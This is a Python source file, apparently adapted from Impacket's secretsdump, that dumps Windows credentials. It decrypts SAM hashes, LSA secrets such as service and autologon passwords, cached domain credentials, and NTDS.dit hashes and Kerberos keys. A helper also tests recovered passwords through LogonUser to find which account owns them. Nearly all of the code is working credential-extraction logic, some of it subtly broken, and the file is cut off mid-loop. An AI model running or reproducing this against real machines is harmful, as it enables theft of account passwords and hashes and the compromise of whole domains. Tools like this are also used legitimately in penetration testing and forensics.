#!/usr/bin/python
# Copyright (c) 2003-2015 CORE Security Technologies
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# $Id$
#
# Description: Performs various techniques to dump hashes from the
#              remote machine without executing any agent there.
#              For SAM and LSA Secrets (including cached creds)
#              we try to read as much as we can from the registry
#              and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir)
#              and read the rest of the data from there.
#              For NTDS.dit, we have to extract NTDS.dit via vssadmin executed
#              with the smbexec approach. It's copied on the temp dir and parsed
#              remotely.
#              The scripts initiates the services required for its working 
#              if they are not available (e.g. Remote Registry, even if it is 
#              disabled). After the work is done, things are restored to the 
#              original state.
#
# Author:
#  Alberto Solino (@agsolino)
#
# References: Most of the work done by these guys. I just put all
#             the pieces together, plus some extra magic.
#
# http://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
# http://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
# http://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
# http://www.quarkslab.com/en-blog+read+13
# https://code.google.com/p/creddump/
# http://lab.mediaservice.net/code/cachedump.rb
# http://insecurety.net/?p=768
# http://www.beginningtoseethelight.org/ntsecurity/index.htm
# http://www.ntdsxtract.com/downloads/ActiveDirectoryOfflineHashDumpAndForensics.pdf
# http://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

from impacket import winregistry, ntlm
from impacket.dcerpc.v5 import samr
from impacket.structure import Structure
from impacket.ese import ESENT_DB

from struct import unpack, pack
from collections import OrderedDict
import win32con, win32security, win32net
import binascii
from config.dico import get_dico
from config.write_output import print_debug, print_output
# import logging
from config.constant import *
from config.header import Header

import sys
import random
import hashlib
import tempfile
import os
import traceback
import ntpath
import time
import string
from itertools import product

try:
	from Crypto.Cipher import DES, ARC4, AES
	from Crypto.Hash import HMAC, MD4
except Exception:
	print "Warning: You don't have any crypto installed. You need PyCrypto"
	print "See http://www.pycrypto.org/"

class FindUSer():
	def __init__(self):
		self.domain = '.' # current domain
		self.logontype = win32con.LOGON32_LOGON_INTERACTIVE
		self.provider = win32con.LOGON32_PROVIDER_WINNT50
		IP = '127.0.0.1'
		self.users = win32net.NetGroupGetUsers(IP,'none',0)[0]
		
	def find_userName(self, password):
		for user in self.users:
			try:
				token = win32security.LogonUser(user['name'], self.domain, password , self.logontype, self.provider)
				return user['name']
			except:
				pass
		return False 

# Structures
# Taken from http://insecurety.net/?p=768
class SAM_KEY_DATA(Structure):
	structure = (
		('Revision','<L=0'),
		('Length','<L=0'),
		('Salt','16s=""'),
		('Key','16s=""'),
		('CheckSum','16s=""'),
		('Reserved','<Q=0'),
	)

class DOMAIN_ACCOUNT_F(Structure):
	structure = (
		('Revision','<L=0'),
		('Unknown','<L=0'),
		('CreationTime','<Q=0'),
		('DomainModifiedCount','<Q=0'),
		('MaxPasswordAge','<Q=0'),
		('MinPasswordAge','<Q=0'),
		('ForceLogoff','<Q=0'),
		('LockoutDuration','<Q=0'),
		('LockoutObservationWindow','<Q=0'),
		('ModifiedCountAtLastPromotion','<Q=0'),
		('NextRid','<L=0'),
		('PasswordProperties','<L=0'),
		('MinPasswordLength','<H=0'),
		('PasswordHistoryLength','<H=0'),
		('LockoutThreshold','<H=0'),
		('Unknown2','<H=0'),
		('ServerState','<L=0'),
		('ServerRole','<H=0'),
		('UasCompatibilityRequired','<H=0'),
		('Unknown3','<Q=0'),
		('Key0',':', SAM_KEY_DATA),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
	)

# Great help from here http://www.beginningtoseethelight.org/ntsecurity/index.htm
class USER_ACCOUNT_V(Structure):
	structure = (
		('Unknown','12s=""'),
		('NameOffset','<L=0'),
		('NameLength','<L=0'),
		('Unknown2','<L=0'),
		('FullNameOffset','<L=0'),
		('FullNameLength','<L=0'),
		('Unknown3','<L=0'),
		('CommentOffset','<L=0'),
		('CommentLength','<L=0'),
		('Unknown3','<L=0'),
		('UserCommentOffset','<L=0'),
		('UserCommentLength','<L=0'),
		('Unknown4','<L=0'),
		('Unknown5','12s=""'),
		('HomeDirOffset','<L=0'),
		('HomeDirLength','<L=0'),
		('Unknown6','<L=0'),
		('HomeDirConnectOffset','<L=0'),
		('HomeDirConnectLength','<L=0'),
		('Unknown7','<L=0'),
		('ScriptPathOffset','<L=0'),
		('ScriptPathLength','<L=0'),
		('Unknown8','<L=0'),
		('ProfilePathOffset','<L=0'),
		('ProfilePathLength','<L=0'),
		('Unknown9','<L=0'),
		('WorkstationsOffset','<L=0'),
		('WorkstationsLength','<L=0'),
		('Unknown10','<L=0'),
		('HoursAllowedOffset','<L=0'),
		('HoursAllowedLength','<L=0'),
		('Unknown11','<L=0'),
		('Unknown12','12s=""'),
		('LMHashOffset','<L=0'),
		('LMHashLength','<L=0'),
		('Unknown13','<L=0'),
		('NTHashOffset','<L=0'),
		('NTHashLength','<L=0'),
		('Unknown14','<L=0'),
		('Unknown15','24s=""'),
		('Data',':=""'),
	)

class NL_RECORD(Structure):
	structure = (
		('UserLength','<H=0'),
		('DomainNameLength','<H=0'),
		('EffectiveNameLength','<H=0'),
		('FullNameLength','<H=0'),
		('MetaData','52s=""'),
		('FullDomainLength','<H=0'),
		('Length2','<H=0'),
		('CH','16s=""'),
		('T','16s=""'),
		('EncryptedData',':'),
	)

class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
	structure = (
		('Value','6s'),
	)

class SAMR_RPC_SID(Structure):
	structure = (
		('Revision','<B'),
		('SubAuthorityCount','<B'),
		('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
		('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
		('SubAuthority',':'),
	)

	def formatCanonical(self):
	   ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5]))
	   for i in range(self['SubAuthorityCount']):
		   ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
	   return ans

class LSA_SECRET_BLOB(Structure):
	structure = (
		('Length','<L=0'),
		('Unknown','12s=""'),
		('_Secret','_-Secret','self["Length"]'),
		('Secret',':'),
		('Remaining',':'),
	)

class LSA_SECRET(Structure):
	structure = (
		('Version','<L=0'),
		('EncKeyID','16s=""'),
		('EncAlgorithm','<L=0'),
		('Flags','<L=0'),
		('EncryptedData',':'),
	)

class LSA_SECRET_XP(Structure):
	structure = (
		('Length','<L=0'),
		('Version','<L=0'),
		('_Secret','_-Secret', 'self["Length"]'),
		('Secret', ':'),
	)

class CryptoCommon:
	# Common crypto stuff used over different classes
	def transformKey(self, InputKey):
		# Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
		OutputKey = []
		OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
		OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
		OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
		OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
		OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
		OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
		OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
		OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )

		for i in range(8):
			OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)

		return "".join(OutputKey)

	def deriveKey(self, baseKey):
		# 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
		# Let I be the little-endian, unsigned integer.
		# Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
		# Note that because I is in little-endian byte order, I[0] is the least significant byte.
		# Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
		# Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
		key = pack('<L',baseKey)
		key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
		key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
		return self.transformKey(key1),self.transformKey(key2)
	
class OfflineRegistry:
	def __init__(self, hiveFile = None, isRemote = False):
		self.__hiveFile = hiveFile
		if self.__hiveFile is not None:
			self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)

	def enumKey(self, searchKey):
		parentKey = self.__registryHive.findKey(searchKey)
		if parentKey is None:
			return
		keys = self.__registryHive.enumKey(parentKey)
		return keys

	def enumValues(self, searchKey):
		key = self.__registryHive.findKey(searchKey)
		if key is None:
			return

		values = self.__registryHive.enumValues(key)
		return values

	def getValue(self, keyValue):
		value = self.__registryHive.getValue(keyValue)
		if value is None:
			return
		return value

	def getClass(self, className):
		value = self.__registryHive.getClass(className)
		if value is None:
			return
		return value

	def finish(self):
		if self.__hiveFile is not None:
			# Remove temp file and whatever else is needed
			self.__registryHive.close()

class SAMHashes(OfflineRegistry):
	def __init__(self, samFile, bootKey, isRemote = False):
		OfflineRegistry.__init__(self, samFile, isRemote)
		self.__samFile = samFile
		self.__hashedBootKey = ''
		self.__bootKey = bootKey
		self.__cryptoCommon = CryptoCommon()
		self.__itemsFound = {}

	def MD5(self, data):
		md5 = hashlib.new('md5')
		md5.update(data)
		return md5.digest()

	def getHBootKey(self):
		# logging.debug('Calculating HashedBootKey from SAM')
		QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
		DIGITS = "0123456789012345678901234567890123456789\0"

		F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]

		domainData = DOMAIN_ACCOUNT_F(F)

		rc4Key = self.MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)

		rc4 = ARC4.new(rc4Key)
		self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])

		# Verify key with checksum
		checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

		if checkSum != self.__hashedBootKey[16:]:
			raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

	def __decryptHash(self, rid, cryptedHash, constant):
		# Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
		# plus hashedBootKey stuff
		Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

		Crypt1 = DES.new(Key1, DES.MODE_ECB)
		Crypt2 = DES.new(Key2, DES.MODE_ECB)

		rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
		rc4 = ARC4.new(rc4Key)
		key = rc4.encrypt(cryptedHash)

		decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

		return decryptedHash

	def dump(self):
		NTPASSWORD = "NTPASSWORD\0"
		LMPASSWORD = "LMPASSWORD\0"

		if self.__samFile is None:
			# No SAM file provided
			return

		self.getHBootKey()
		usersKey = 'SAM\\Domains\\Account\\Users'

		# Enumerate all the RIDs
		rids = self.enumKey(usersKey)
		# Remove the Names item
		try:
			rids.remove('Names')
		except:
			pass

		for rid in rids:
			userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
			rid = int(rid,16)

			baseOffset = len(USER_ACCOUNT_V())

			V = userAccount['Data']

			userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

			if userAccount['LMHashLength'] == 20:
				encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
			else:
				encLMHash = ''

			if userAccount['NTHashLength'] == 20:
				encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
			else:
				encNTHash = ''

			lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
			ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)

			if lmHash == '':
				lmHash = ntlm.LMOWFv1('','')
			if ntHash == '':
				ntHash = ntlm.NTOWFv1('','')

			answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
			self.__itemsFound[rid] = answer
			
		return self.__itemsFound

class LSASecrets(OfflineRegistry):
	def __init__(self, securityFile, bootKey, isRemote = False):
		OfflineRegistry.__init__(self,securityFile, isRemote)
		self.__hashedBootKey = ''
		self.__bootKey = bootKey
		self.__LSAKey = ''
		self.__NKLMKey = ''
		self.__isRemote = isRemote
		self.__vistaStyle = True
		self.__cryptoCommon = CryptoCommon()
		self.__securityFile = securityFile
		self.__cachedItems = []
		self.__secretItems = []

	def MD5(self, data):
		md5 = hashlib.new('md5')
		md5.update(data)
		return md5.digest()

	def __sha256(self, key, value, rounds=1000):
		sha = hashlib.sha256()
		sha.update(key)
		for i in range(1000):
			sha.update(value)
		return sha.digest()

	def __decryptAES(self, key, value, iv='\x00'*16):
		plainText = ''
		if iv != '\x00'*16:
			aes256 = AES.new(key,AES.MODE_CBC, iv)

		for index in range(0, len(value), 16):
			if iv == '\x00'*16:
				aes256 = AES.new(key,AES.MODE_CBC, iv)
			cipherBuffer = value[index:index+16]
			# Pad buffer to 16 bytes
			if len(cipherBuffer) < 16:
				cipherBuffer += '\x00' * (16-len(cipherBuffer))
			plainText += aes256.decrypt(cipherBuffer)

		return plainText

	def __decryptSecret(self, key, value):
		# [MS-LSAD] Section 5.1.2
		plainText = ''

		encryptedSecretSize = unpack('<I', value[:4])[0]
		value = value[len(value)-encryptedSecretSize:]

		key0 = key
		for i in range(0, len(value), 8):
			cipherText = value[:8]
			tmpStrKey = key0[:7]
			tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
			Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
			plainText += Crypt1.decrypt(cipherText) 
			cipherText = cipherText[8:]
			key0 = key0[7:]
			value = value[8:]
			# AdvanceKey
			if len(key0) < 7:
				key0 = key[len(key0):]

		secret = LSA_SECRET_XP(plainText)
		return (secret['Secret'])

	def __decryptHash(self, key, value, iv):
		hmac_md5 = HMAC.new(key,iv)
		rc4key = hmac_md5.digest()
	
		rc4 = ARC4.new(rc4key)
		data = rc4.encrypt(value)
		return data

	def __decryptLSA(self, value):
		if self.__vistaStyle is True:
			# ToDo: There could be more than one LSA Keys
			record = LSA_SECRET(value)
			tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
			plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
			record = LSA_SECRET_BLOB(plainText)
			self.__LSAKey = record['Secret'][52:][:32]
  
		else:
			md5 = hashlib.new('md5')
			md5.update(self.__bootKey)
			for i in range(1000):
				md5.update(value[60:76])
			tmpKey = md5.digest()
			rc4 = ARC4.new(tmpKey)
			plainText = rc4.decrypt(value[12:60])
			self.__LSAKey = plainText[0x10:0x20]

	def __getLSASecretKey(self):
		# logging.debug('Decrypting LSA Key')
		# Let's try the key post XP
		value = self.getValue('\\Policy\\PolEKList\\default')
		if value is None:
			# logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
			# Second chance
			value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
			self.__vistaStyle = False
			if value is None:
				# No way :(
				return None

		self.__decryptLSA(value[1])

	def __getNLKMSecret(self):
		# logging.debug('Decrypting NL$KM')
		value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
		if value is None:
			raise Exception("Couldn't get NL$KM value")
		if self.__vistaStyle is True:
			record = LSA_SECRET(value[1])
			tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
			self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
		else:
			self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])

	def __pad(self, data):
		if (data & 0x3) > 0:
			return data + (data & 0x3)
		else:
			return data

	def dumpCachedHashes(self):
		if self.__securityFile is None:
			# No SECURITY file provided
			return

		# Let's first see if there are cached entries
		values = self.enumValues('\\Cache')
		if values == None:
			# No cache entries
			return
		try:
			# Remove unnecesary value
			values.remove('NL$Control')
		except:
			pass

		self.__getLSASecretKey()
		self.__getNLKMSecret()
		
		for value in values:
			# logging.debug('Looking into %s' % value)
			record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
			if record['CH'] != 16 * '\x00':
				if self.__vistaStyle is True:
					plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
				else:
					plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
					pass
				encHash = plainText[:0x10]
				plainText = plainText[0x48:]
				userName = plainText[:record['UserLength']].decode('utf-16le')
				plainText = plainText[self.__pad(record['UserLength']):]
				domain = plainText[:record['DomainNameLength']].decode('utf-16le')
				plainText = plainText[self.__pad(record['DomainNameLength']):]
				domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
				answer = "%s:%s:%s:%s:::" % (userName, encHash.encode('hex'), domainLong, domain)
				self.__cachedItems.append(answer)
				
		return __cachedItems

	def __printSecret(self, name, secretItem):
		# Based on [MS-LSAD] section 3.1.1.4

		# First off, let's discard NULL secrets.
		if len(secretItem) == 0:
			# logging.debug('Discarding secret %s, NULL Data' % name)
			return

		# We might have secrets with zero
		if secretItem.startswith('\x00\x00'):
			# logging.debug('Discarding secret %s, all zeros' % name)
			return

		upperName = name.upper()
		
		values = {}
		values['Category'] = name
		user = ''
		password = ''
		
		# Service passwords
		if upperName.startswith('_SC_'):
			values['Category'] = 'Windows Service'
			values['Service Name'] = name
			try: 
				strDecoded = secretItem.decode('utf-16le')
			except:
				pass
			else:
				# Account the service runs under
				user = FindUSer().find_userName(strDecoded)
				if not user: 
					user = '(Unknown User)'
				password = strDecoded
		
		# defaults password for winlogon
		elif upperName.startswith('DEFAULTPASSWORD'):
			values['Category'] = 'Windows Autologon'
			# Let's first try to decode the secret
			try: 
				strDecoded = secretItem.decode('utf-16le')
			except:
				pass
			else:
				user = FindUSer().find_userName(strDecoded)
				if not user: 
					user = '(Unknown User)'
				password = strDecoded
		elif upperName.startswith('ASPNET_WP_PASSWORD'):
			try: 
				strDecoded = secretItem.decode('utf-16le')
			except:
				pass
			else:
				user = 'ASPNET'
				password = strDecoded
		
		# compute MD4 of the secret.. yes.. that is the nthash? :-o
		elif upperName.startswith('$MACHINE.ACC'):
			md4 = MD4.new()
			md4.update(secretItem)
			user = '$MACHINE.ACC: %s' % ntlm.LMOWFv1('','').encode('hex')
			password = md4.digest().encode('hex')
		
		if user:
			values['user'] = user
			values['password'] = password
		else:
			# Default print, hexdump
			values['password in hex'] = secretItem.encode('hex')
			# hexdump(secretItem)
		
		self.__secretItems.append(values)

	def dumpSecrets(self):
		if self.__securityFile is None:
			# No SECURITY file provided
			return

		# Let's first see if there are cached entries
		keys = self.enumKey('\\Policy\\Secrets')
		if keys == None:
			# No entries
			return
		try:
			# Remove unnecessary value
			keys.remove('NL$Control')
		except:
			pass

		if self.__LSAKey == '':
			self.__getLSASecretKey()

		for key in keys:
			# logging.debug('Looking into %s' % key)
			value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)

			if value is not None:
				if self.__vistaStyle is True:
					record = LSA_SECRET(value[1])
					tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
					plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
					record = LSA_SECRET_BLOB(plainText)
					secret = record['Secret']
				else:
					secret = self.__decryptSecret(self.__LSAKey, value[1])
				self.__printSecret(key, secret)
		return self.__secretItems 

class NTDSHashes():
	NAME_TO_INTERNAL = { 
		'uSNCreated':'ATTq131091',
		'uSNChanged':'ATTq131192',
		'name':'ATTm3',
		'objectGUID':'ATTk589826',
		'objectSid':'ATTr589970',
		'userAccountControl':'ATTj589832',
		'primaryGroupID':'ATTj589922',
		'accountExpires':'ATTq589983',
		'logonCount':'ATTj589993',
		'sAMAccountName':'ATTm590045',
		'sAMAccountType':'ATTj590126',
		'lastLogonTimestamp':'ATTq589876',
		'userPrincipalName':'ATTm590480',
		'unicodePwd':'ATTk589914',
		'dBCSPwd':'ATTk589879',
		'ntPwdHistory':'ATTk589918',
		'lmPwdHistory':'ATTk589984',
		'pekList':'ATTk590689',
		'supplementalCredentials':'ATTk589949',
	}

	KERBEROS_TYPE = {
		1:'dec-cbc-crc',
		3:'des-cbc-md5',
		17:'aes128-cts-hmac-sha1-96',
		18:'aes256-cts-hmac-sha1-96',
		0xffffff74:'rc4_hmac',
	}

	INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

	SAM_NORMAL_USER_ACCOUNT = 0x30000000
	SAM_MACHINE_ACCOUNT     = 0x30000001
	SAM_TRUST_ACCOUNT       = 0x30000002

	ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)
	
	class PEK_KEY(Structure):
		structure = (
			('Header','8s=""'),
			('KeyMaterial','16s=""'),
			('EncryptedPek','52s=""'),
		)

	class CRYPTED_HASH(Structure):
		structure = (
			('Header','8s=""'),
			('KeyMaterial','16s=""'),
			('EncryptedHash','16s=""'),
		)

	class CRYPTED_HISTORY(Structure):
		structure = (
			('Header','8s=""'),
			('KeyMaterial','16s=""'),
			('EncryptedHash',':'),
		)

	class CRYPTED_BLOB(Structure):
		structure = (
			('Header','8s=""'),
			('KeyMaterial','16s=""'),
			('EncryptedHash',':'),
		)

	def __init__(self, ntdsFile, bootKey, isRemote = False, history = False, noLMHash = True):
		self.__bootKey = bootKey
		self.__NTDS = ntdsFile
		self.__history = history
		self.__noLMHash = noLMHash
		if self.__NTDS is not None:
			self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
			self.__cursor = self.__ESEDB.openTable('datatable')
		self.__tmpUsers = list()
		self.__PEK = None
		self.__cryptoCommon = CryptoCommon()
		self.__hashesFound = {}
		self.__kerberosKeys = OrderedDict()

	def __getPek(self):
		# logging.info('Searching for pekList, be patient')
		pek = None
		while True:
			record = self.__ESEDB.getNextRow(self.__cursor)
			if record is None:
				break
			elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
				pek =  record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
				break
			elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
				# Okey.. we found some users, but we're not yet ready to process them.
				# Let's just store them in a temp list
				self.__tmpUsers.append(record)

		if pek is not None:
			encryptedPek = self.PEK_KEY(pek)
			md5 = hashlib.new('md5')
			md5.update(self.__bootKey)
			for i in range(1000):
				md5.update(encryptedPek['KeyMaterial'])
			tmpKey = md5.digest()
			rc4 = ARC4.new(tmpKey)
			plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
			self.__PEK = plainText[36:]

	def __removeRC4Layer(self, cryptedHash):
		md5 = hashlib.new('md5')
		md5.update(self.__PEK)
		md5.update(cryptedHash['KeyMaterial'])
		tmpKey = md5.digest()
		rc4 = ARC4.new(tmpKey)
		plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

		return plainText

	def __removeDESLayer(self, cryptedHash, rid):
		Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))
		Crypt1 = DES.new(Key1, DES.MODE_ECB)
		Crypt2 = DES.new(Key2, DES.MODE_ECB)
		decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])
		return decryptedHash

	def __decryptSupplementalInfo(self, record):
		# This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
		if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
			if len(record[self.NAME_TO_INTERNAL['supplementalCredentials']].decode('hex')) > 24:
				if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
					domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
					userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
				else: 
					userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
				cipherText = self.CRYPTED_BLOB(record[self.NAME_TO_INTERNAL['supplementalCredentials']].decode('hex'))
				plainText = self.__removeRC4Layer(cipherText)
				try:
					userProperties = samr.USER_PROPERTIES(plainText)
				except:
					# On some old w2k3 there might be user properties that don't 
					# match [MS-SAMR] structure, discarding them
					return
				propertiesData = userProperties['UserProperties']
				for propertyCount in range(userProperties['PropertyCount']):
					userProperty = samr.USER_PROPERTY(propertiesData)   
					propertiesData = propertiesData[len(userProperty):]
					# For now, we will only process Newer Kerberos Keys. 
					if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
						propertyValueBuffer = userProperty['PropertyValue'].decode('hex')
						kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
						data = kerbStoredCredentialNew['Buffer']
						for credential in range(kerbStoredCredentialNew['CredentialCount']):
							keyDataNew = samr.KERB_KEY_DATA_NEW(data)
							data = data[len(keyDataNew):]
							keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
	
							if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
								answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],keyValue.encode('hex'))
							else:
								answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),keyValue.encode('hex'))
							# We're just storing the keys, not printing them, to make the output more readable
							# This is kind of ugly... but it's what I came up with tonight to get an ordered
							# set :P. Better ideas welcomed ;)
							self.__kerberosKeys[answer] = None

	def __decryptHash(self, record):
		# logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
		
		sid = SAMR_RPC_SID(record[self.NAME_TO_INTERNAL['objectSid']].decode('hex'))
		rid = sid.formatCanonical().split('-')[-1]

		if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
			encryptedLMHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['dBCSPwd']].decode('hex'))
			tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
			LMHash = self.__removeDESLayer(tmpLMHash, rid)
		else:
			LMHash = ntlm.LMOWFv1('','')
			encryptedLMHash = None

		if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
			encryptedNTHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['unicodePwd']].decode('hex'))
			tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
			NTHash = self.__removeDESLayer(tmpNTHash, rid)
		else:
			NTHash = ntlm.NTOWFv1('','')
			encryptedNTHash = None

		if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
			domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
			userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
		else: 
			userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
 
		answer =  "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
		self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
		# print answer
	  
		if self.__history:
			LMHistory = []
			NTHistory = []
			if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
				lmPwdHistory = record[self.NAME_TO_INTERNAL['lmPwdHistory']]
				encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
				tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
				for i in range(0, len(tmpLMHistory)/16):
					LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
					LMHistory.append(LMHash)

			if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
				ntPwdHistory = record[self.NAME_TO_INTERNAL['ntPwdHistory']]
				encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
				tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
				for i in range(0, len(tmpNTHistory)/16):
					NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
					NTHistory.append(NTHash)

			for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
				if self.__noLMHash:
					lmhash = ntlm.LMOWFv1('','').encode('hex')
				else:
					lmhash = LMHash.encode('hex')
			
				answer =  "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
				self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
				# print answer

	def dump(self):
		if self.__NTDS is None:
			# No NTDS.dit file provided
			return
		# logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
		# We start getting rows from the table aiming at reaching
		# the pekList. If we find users records we stored them 
		# in a temp list for later process.
		self.__getPek()
		if self.__PEK is not None:
			# logging.info('Pek found and decrypted: 0x%s' % self.__PEK.encode('hex'))
			# logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
			# First of all, if we have users already cached, let's decrypt their hashes
			for record in self.__tmpUsers:
				try:
					self.__decryptHash(record)
					self.__decryptSupplementalInfo(record)
				except Exception, e:
					try:
						# logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
						# logging.error(str(e))
						pass
					except: 
						# logging.error("Error while processing row!")
						# logging.error(str(e))
						pass

			# Now let's keep moving through the NTDS file and decrypting what we find
			while True:
				try:
					record = self.__ESEDB.getNextRow(self.__cursor)
				except: 
